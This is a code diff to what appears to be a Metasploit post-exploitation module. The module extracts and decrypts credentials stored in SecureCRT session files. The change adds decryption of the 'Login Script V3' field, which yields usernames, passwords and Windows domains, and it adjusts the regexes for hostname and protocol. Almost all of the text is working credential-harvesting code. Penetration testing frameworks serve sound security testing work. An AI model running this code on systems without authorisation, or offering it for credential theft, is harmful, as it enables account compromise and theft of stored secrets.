@@ -73,13 +73,24 @@ class MetasploitModule < Msf::Post
       end
 
       file = try_encode_file(file_contents)
-      protocol = Regexp.compile('S:"Protocol Name"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
-      hostname = Regexp.compile('S:"Hostname"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
-      password = Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file) ? securecrt_crypto(Regexp.last_match(1)) : nil
-      passwordv2 = Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
+      protocol = Regexp.compile('S:"Protocol Name"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
+      hostname = Regexp.compile('S:"Hostname"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
+      decrypted_script = Regexp.compile('S:"Login Script V3"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
+      if !decrypted_script.nil?
+        username = decrypted_script.match(/login name:\x1F(\S+)\x1F0\x1Fpass/u)[1]
+        password = decrypted_script.match(/password:\x1F([\S]+)\x1F0/u)[1]
+        domain = decrypted_script.match(/Windows Domain:\x1F([\S]+)\x1F/u) ? decrypted_script.match(/Windows Domain:\x1F([\S]+)\x1F/u)[1] : nil
+        if !domain.nil?
+          username = domain + '\\' + username
+        end
+      else
+        password = Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file) ? securecrt_crypto(Regexp.last_match(1)) : nil
+        passwordv2 = Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
+        username = Regexp.compile('S:"Username"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
+      end
+
       port = Regexp.compile("D:\"\\\[#{protocol}\\\] Port\"=([0-9a-f]{8})").match(file) ? Regexp.last_match(1).to_i(16).to_s : nil
       port = Regexp.compile('D:"Port"=([0-9a-f]{8})').match(file) ? Regexp.last_match(1).to_i(16).to_s : nil if !port
-      username = Regexp.compile('S:"Username"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
 
       tbl << {
         file_name: item['name'],
